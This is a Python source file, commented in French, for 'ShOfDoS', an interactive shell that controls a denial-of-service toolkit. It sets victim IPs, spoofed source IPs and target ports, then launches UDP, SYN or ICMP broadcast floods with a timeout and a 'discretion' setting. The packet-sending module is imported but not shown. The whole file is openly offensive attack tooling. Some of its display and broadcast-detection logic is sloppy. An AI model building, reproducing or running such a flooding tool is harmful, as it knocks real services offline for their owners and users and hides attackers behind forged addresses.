#Auteur --> aiglematth

#Imports
from cmd import Cmd
from sys import exit
from shlex import split
import floods

#Classe du shell
class Shell(Cmd):
	def __init__(self):
		Cmd.__init__(self)
		self.prompt = "ShOfDoS >> "
		self.Flooder = floods.UdpFlood()
		self.SynFlooder = floods.SynFlood()
		self.IcmpFlood = floods.IcmpFlood()

	def do_exit(self, arg):
		"Quitte le programme"
		exit()

	def setIpToOff(self, Flood, liste):
		Flood.ipToOff = liste[0]

	def do_setIpToOff(self, arg):
		"Définit l'ip à attaquer, prend le type d'attaque (udp, syn) et l'ip"
		liste = split(arg)
		if liste == []:
			print("Veuillez mettre des paramètres...")
			return False
		proto = liste[0].upper()
		liste.__delitem__(0)
		if proto == "UDP":
			self.setIpToOff(self.Flooder, liste)
		elif proto == "SYN":
			self.setIpToOff(self.SynFlooder, liste)

	def setIpSpoof(self, Flood, liste):
		if len(liste) > 1:
			for ip in liste:
				Flood.ipSpoofs.append(ip)
		else:
			Flood.ipSpoof = liste[0]

	def do_setIpSpoof(self, arg):
		"Définit une ou plusieurs ip(s) qu'on spoof, prend le type d'attaque (udp, syn) et le/les ip(s)"
		liste = split(arg)
		if liste == []:
			print("Veuillez mettre des paramètres...")
			return False
		proto = liste[0].upper()
		liste.__delitem__(0)
		if proto == "UDP":
			self.setIpSpoof(self.Flooder, liste)
		elif proto == "SYN":
			self.setIpSpoof(self.SynFlooder, liste)

	def setTargetPort(self, Flood, liste):
		if len(liste) > 1:
			for port in liste:
				Flood.ports.append(int(port))
		else:
			Flood.port = int(liste[0])

	def do_setTargetPort(self, arg):
		"Définit un ou plusieurs port(s) qu'on attaquera, prend le type d'attaque (udp, syn) et le/les port(s)"
		liste = split(arg)
		if liste == []:
			print("Veuillez mettre des paramètres...")
			return False
		proto = liste[0].upper()
		liste.__delitem__(0)
		if proto == "UDP":
			self.setTargetPort(self.Flooder, liste)
		elif proto == "SYN":
			self.setTargetPort(self.SynFlooder, liste)

	def showInfos(self, Flood):
		print("## INFOS {} ##".format(Flood.name))
		print("Ip unique à spoofer :")
		print("{}".format(Flood.ipSpoof))
		print("Ips multiples à spoofer :")

		for ip in Flood.ipSpoofs:
			print("{}".format(ip))
			print("Port unique à attaquer :")
			print("{}".format(Flood.port))
			print("Ports multiples à attaquer :")

		print("Ip à attaquer :")
		print(Flood.ipToOff)

		print("Port unique à spoofer :")
		print("{}".format(Flood.port))
		print("ports multiples à spoofer :")

		for port in Flood.ports:
			print("{}".format(port))

		print("###########")
		print("\n\r")

	def do_showInfos(self, arg):
		"Montre les infos (ips spoof et ports) qui sont actives, prend le type d'attaque en paramètre (udp, syn), si rien n'est précisé, toutes les infos sont montrées"
		liste = split(arg)
		if liste != []:
			proto = liste[0]
		else:
			proto = "NONE"

		if proto.upper() == "UDP":
			self.showInfos(self.Flooder)
		elif proto.upper() == "SYN":
			self.showInfos(self.SynFlooder)
		else:
			self.showInfos(self.Flooder)
			self.showInfos(self.SynFlooder)

	def setNullValue(self, Flood, setNullValueV):
		if "uniqueIp" in setNullValueV:
			Flood.ipSpoof = None
		elif "ips" in setNullValueV:
			Flood.ipSpoofs = []
		elif "uniquePort" in setNullValueV:
			Flood.port = None
		elif "ports" in setNullValueV:
			Flood.ports = []

	def do_setNullValue(self, arg):
		"Remet à nulle une des données d'ip ou de port, prend comme paramètre le type d'attaque (udp, syn) et une liste des valeures (uniqueIp, ips, uniquePort, ports) à remettre à 0"
		liste = split(arg)
		if liste == []:
			print("Veuillez mettre des paramètres...")
			return False
		proto = liste[0]
		liste.__delitem__(0)
		if proto.upper() == "UDP":
			self.setNullValue(self.Flooder, liste)
		elif proto.upper() == "SYN":
			self.setNullValue(self.SynFlooder, liste)

	def do_flood(self, arg):
		"Lance le flood udp, prend un type d'attaque (udp, syn, icmp), un timeout (secondes) et un niveau de discrétion (entre 1 et 100)"
		liste = split(arg)
		if len(liste) < 3:
			print("Veuillez mettre des paramètres...")
			return False
		else:
			(proto, timeout, discretion) = (liste[0], int(liste[1]), int(liste[2]))

		if proto.upper() == "UDP":
			self.Flooder.Flood(timeout, discretion)
		elif proto.upper() == "SYN":
			self.SynFlooder.Flood(timeout, discretion)
		elif proto.upper() == "ICMP":
			self.IcmpFlood.ipSpoof = input("Ip de la victime >> ")
			self.IcmpFlood.broadcast = input("Addresse de broadcast (si non renseigné elle sera recherché automatiquement) >> ")
			if self.IcmpFlood.broadcast == None:
				self.IcmpFlood.searchBroadcast()
			self.IcmpFlood.Flood(timeout, discretion)

if __name__ == "__main__":
	s = Shell()
	s.cmdloop()
